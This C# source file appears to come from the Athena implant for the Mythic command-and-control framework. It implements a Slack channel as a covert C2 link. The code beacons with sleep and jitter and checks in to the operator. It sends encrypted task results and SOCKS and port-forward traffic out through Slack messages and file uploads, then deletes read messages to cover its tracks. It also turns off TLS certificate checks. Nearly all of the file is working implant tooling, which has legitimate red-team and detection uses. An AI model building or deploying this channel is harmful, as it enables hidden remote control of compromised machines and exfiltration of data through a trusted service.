using Athena.Commands;
using Athena.Models.Commands;
using Athena.Models.Config;
using Athena.Models.Mythic.Checkin;
using Athena.Models.Mythic.Tasks;
using Athena.Profiles.Slack;
using Athena.Utilities;

using System.Diagnostics;
using System.Net;
using System.Net.Http.Headers;
using System.Net.Security;
using System.Text.Json;

using Slack.NetStandard;
using Slack.NetStandard.Messages;
using Slack.NetStandard.Messages.Blocks;
using Slack.NetStandard.WebApi.Chat;
using Slack.NetStandard.WebApi.Conversations;
using Slack.NetStandard.WebApi.Files;
using Athena.Models.Comms.SMB;
using Athena.Models.Proxy;

namespace Athena.Profiles.Slack
{
    public class Slack : IProfile
    {
        public IProfile profile { get; set; }
        public DateTime killDate { get; set; }
        public int sleep { get; set; }
        public int jitter { get; set; }
        public string uuid { get; set; }
        public bool encrypted { get; set; }
        public PSKCrypto crypt { get; set; }
        public string psk { get; set; }
        public bool encryptedExchangeCheck { get; set; }
        private string messageToken { get; set; }
        private string channel { get; set; }
        private int messageChecks { get; set; } //How many times to attempt to send/read messages before assuming a failure
        private int timeBetweenChecks { get; set; } //How long (in seconds) to wait in between checks
        private string userAgent { get; set; }
        public string proxyHost { get; set; }
        public string proxyPass { get; set; }
        public string proxyUser { get; set; }
        private int currentAttempt = 0;
        private int maxAttempts = 10;
        private string agent_guid = Guid.NewGuid().ToString();
        private CancellationTokenSource cts = new CancellationTokenSource();
        public event EventHandler<MessageReceivedArgs> SetMessageReceived;

        private SlackWebApiClient client { get; set; }

        public Slack()
        {
            this.psk = "AESPSK";
            this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
            this.messageToken = "slack_message_token";
            this.channel = "slack_channel_id";
            this.userAgent = "user_agent";
            this.messageChecks = int.Parse("message_checks");
            this.timeBetweenChecks = int.Parse("time_between_checks");
            this.proxyHost = "proxy_host:proxy_port";
            this.proxyPass = "proxy_pass";
            this.proxyUser = "proxy_user";
            this.uuid = "%UUID%";
            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
            this.killDate = kd;
            int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
            this.sleep = sleep;
            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
            this.jitter = jitter;
            //Might need to make this configurable
            ServicePointManager.ServerCertificateValidationCallback =
                   new RemoteCertificateValidationCallback(
                        delegate
                        { return true; }
                    );
            HttpClientHandler handler = new HttpClientHandler();
            this.client = new SlackWebApiClient(this.messageToken);
            if (!string.IsNullOrEmpty(this.psk))
            {
                this.crypt = new PSKCrypto(this.uuid, this.psk);
                this.encrypted = true;
            }

            if (!string.IsNullOrEmpty(this.proxyHost) && this.proxyHost != ":")
            {
                WebProxy wp = new WebProxy()
                {
                    Address = new Uri(this.proxyHost)
                };

                if (!string.IsNullOrEmpty(this.proxyPass) && !string.IsNullOrEmpty(this.proxyUser))
                {
                    handler.DefaultProxyCredentials = new NetworkCredential(this.proxyUser, this.proxyPass);
                }
                handler.Proxy = wp;
            }

            this.client = new SlackWebApiClient(new HttpClient(handler), token: this.messageToken);

            if (!string.IsNullOrEmpty(this.userAgent))
            {
                this.client.Client.DefaultRequestHeaders.UserAgent.ParseAdd(this.userAgent);
            }

            this.client.Conversations.Join(this.channel);
        }


        //Send Message
        public async Task<bool> Send(string json)
        {
            Debug.WriteLine($"[{DateTime.Now}] Message to Mythic: {json}");
            try
            {

                if (this.encrypted)
                {
                    json = this.crypt.Encrypt(json);
                }
                else
                {
                    json = await Misc.Base64Encode(this.uuid + json);
                }

                int i = 0;

                Debug.WriteLine($"[{DateTime.Now}] Writing message to slack channel.");
                while (!await SendSlackMessage(json))
                {
                    if (i == this.messageChecks)
                    {
                        return false;
                    }
                    i++;
                }

                Dictionary<string, MythicMessageWrapper> result;
                json = String.Empty;
                i = 0;

                //Give the server a second to respond.
                Debug.WriteLine($"[{DateTime.Now}] Checking for responses.");
                result = await GetSlackMessages();
                Debug.WriteLine($"[{DateTime.Now}] Received {result.Count} responses.");

                //We should only be getting one message back so this is likely unneeded also
                //But just in case I ever need it later, use LINQ to select unique messages from the result in the event we accidentally receive double messages.
                //Still not right, if we send a command and a task result this is still valid but still fucks up the json
                //Probably just going to take the first item
                //foreach (var message in result.Reverse().FirstOrDefault())
                //{
                //    json += message.Value.message;
                //}

                string strRes;
                //Take only the most recent response in case some messages got left over.
                //This may cause issues in the event I need to implement slack message chunking, but with current max values it should be fine.
                if (result.Count < 0)
                {
                    return false;
                }

                strRes = result.First().Value.message;

                //Delete the messages we've read successfully and indicate we're not waiting for a response anymore
                DeleteMessages(result.Keys.ToList());

                if (this.encrypted)
                {
                    strRes = this.crypt.Decrypt(strRes);
                    Debug.WriteLine($"[{DateTime.Now}] Message from Mythic: {this.crypt.Decrypt(strRes)}");
                }

                if (!string.IsNullOrEmpty(strRes))
                {
                    strRes = Misc.Base64Decode(strRes).Substring(36);
                    Debug.WriteLine($"[{DateTime.Now}] Message from Mythic: {Misc.Base64Decode(strRes).Substring(36)}");
                }

                MessageReceivedArgs mra = new MessageReceivedArgs(strRes);
                SetMessageReceived(this, mra);
            }
            catch (Exception e)
            {
                Debug.WriteLine($"[{DateTime.Now}] Error in Slack send: {e}");
                return false;
            }
            return true;
        }
        private async Task<bool> SendSlackMessage(string data)
        {
            MythicMessageWrapper msg;
            if (data.Count() > 3850)
            {
                Debug.WriteLine($"[{DateTime.Now}] Uploading with attachment.");
                msg = new MythicMessageWrapper()
                {
                    sender_id = this.agent_guid,
                    message = String.Empty,
                    to_server = true,
                    id = 1,
                    final = true
                };
                var request = new FileUploadRequest
                {
                    Channels = this.channel,
                    Title = "",
                    InitialComment = JsonSerializer.Serialize(msg, MythicMessageWrapperJsonContext.Default.MythicMessageWrapper),
                    Content = data,
                    Filetype = "txt"
                };

                var res = await this.client.Files.Upload(request);
                Debug.WriteLine($"[{DateTime.Now}] Upload Success Status: {res.OK}");
                return res.OK;
            }
            else
            {
                Debug.WriteLine($"[{DateTime.Now}] Uploading as raw message.");
                var request = new PostMessageRequest
                {
                    Channel = this.channel,
                };

                msg = new MythicMessageWrapper()
                {
                    sender_id = this.agent_guid,
                    message = data,
                    to_server = true,
                    id = 1,
                    final = true
                };

                request.Blocks.Add(new Section
                {
                    Text = new PlainText(JsonSerializer.Serialize(msg, MythicMessageWrapperJsonContext.Default.MythicMessageWrapper))
                });


                var result = await client.Chat.Post(request);
                Debug.WriteLine($"[{DateTime.Now}] Message Post Success Status: {result.OK}.");
                return result.OK;

            }
        }
        private async Task DeleteMessages(List<string> messages)
        {
            // This works for the current implemenation but may have to change in the event I need to further chunk messages.
            messages.ForEach(async message =>
            {
                try
                {
                    await this.client.Chat.Delete(this.channel, message);
                }
                catch
                { } //Just ignore the exception so that the client can continue communicating back.
            });
        }
        private async Task<Dictionary<string, MythicMessageWrapper>> GetSlackMessages()
        {
            Dictionary<string, MythicMessageWrapper> messages = new Dictionary<string, MythicMessageWrapper>();

            for (int i = 0; i < this.messageChecks; i++)
            {
                var request = new ConversationHistoryRequest
                {
                    Channel = this.channel,
                    Limit = 200,
                };
                await Task.Delay(this.timeBetweenChecks * 1000);

                var conversationsResponse = await this.client.Conversations.History(request);

                if (!conversationsResponse.OK)
                {
                    Debug.WriteLine($"[{DateTime.Now}] Error from slack: {conversationsResponse.Error}");
                    return messages;
                }


                foreach (var message in conversationsResponse.Messages.ToList<Message>())
                {
                    if (message is null || String.IsNullOrEmpty(message.Text) || !message.Text.Contains(this.agent_guid))
                    {
                        continue;
                    }

                    MythicMessageWrapper mythicMessage;

                    try
                    {
                        mythicMessage = JsonSerializer.Deserialize<MythicMessageWrapper>(message.Text, MythicMessageWrapperJsonContext.Default.MythicMessageWrapper);
                    }
                    catch (JsonException e)
                    {
                        Debug.WriteLine($"[{DateTime.Now}] Error deserializing message: {e}");
                        Debug.WriteLine($"[{DateTime.Now}] Message: {message.Text}");
                        continue;
                    }

                    if (mythicMessage == null || mythicMessage.to_server || mythicMessage.sender_id != this.agent_guid)
                    {
                        continue;
                    }
                    Debug.WriteLine($"[{DateTime.Now}] Found a message designated for us.");

                    if (String.IsNullOrEmpty(mythicMessage.message))
                    {
                        using (var requestMessage = new HttpRequestMessage(HttpMethod.Get, message.Files.First().UrlPrivateDownload))
                        {
                            requestMessage.Headers.Authorization = new AuthenticationHeaderValue("Bearer", this.messageToken);

                            var res = await this.client.Client.SendAsync(requestMessage);

                            if (res.IsSuccessStatusCode)
                            {
                                mythicMessage.message = await res.Content.ReadAsStringAsync();
                            }
                            else
                            {
                                Debug.WriteLine($"[{DateTime.Now}] Error getting file contents: {res.StatusCode}");
                            }
                        }
                    }

                    Debug.WriteLine($"[{DateTime.Now}] Adding message to queue.");
                    messages.Add(message.Timestamp, mythicMessage);
                }

                if (messages.Count > 0) //we got something for us
                {
                    break;
                }
            }
            Debug.WriteLine($"[{DateTime.Now}] Returning {messages.Count} messages.");
            return messages;
        }
        public async Task StartBeacon()
        {
            this.cts = new CancellationTokenSource();
            while (!cts.Token.IsCancellationRequested)
            {
                await Task.Delay(await Misc.GetSleep(this.sleep, this.jitter) * 1000);
                Task<List<string>> responseTask = TaskResponseHandler.GetTaskResponsesAsync();
                Task<List<DelegateMessage>> delegateTask = DelegateResponseHandler.GetDelegateMessagesAsync();
                Task<List<MythicDatagram>> socksTask = ProxyResponseHandler.GetSocksMessagesAsync();
                Task<List<MythicDatagram>> rpFwdTask = ProxyResponseHandler.GetRportFwdMessagesAsync();
                await Task.WhenAll(responseTask, delegateTask, socksTask, rpFwdTask);

                GetTasking gt = new GetTasking()
                {
                    action = "get_tasking",
                    tasking_size = -1,
                    delegates = delegateTask.Result,
                    socks = socksTask.Result,
                    responses = responseTask.Result,
                    rpfwd = rpFwdTask.Result,
                };

                //If we don't have anything to return, continue the loop.
                if (delegateTask.Result.Count <= 0 &&
                    socksTask.Result.Count <= 0 &&
                    responseTask.Result.Count <= 0 &&
                    rpFwdTask.Result.Count <= 0)
                {
                    continue;
                }

                try
                {
                    if(await this.Send(JsonSerializer.Serialize(gt, GetTaskingJsonContext.Default.GetTasking)))
                    {
                        continue;
                    }

                    currentAttempt++;

                }
                catch (Exception e)
                {
                    Debug.WriteLine($"[{DateTime.Now}] Becaon attempt failed {e}");
                    this.currentAttempt++;
                }

                if (this.currentAttempt >= this.maxAttempts)
                {
                    this.cts.Cancel();
                }
            }
        }
        public bool StopBeacon()
        {
            this.cts.Cancel();
            return true;
        }
        public async Task<bool> Checkin(Checkin checkin)
        {
            int maxAttempts = 3;
            int currentAttempt = 0;
            do
            {
                if(await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin)))
                {
                    return true;
                }
                currentAttempt++;
            } while (currentAttempt <= maxAttempts);

            return false;
        }
    }
}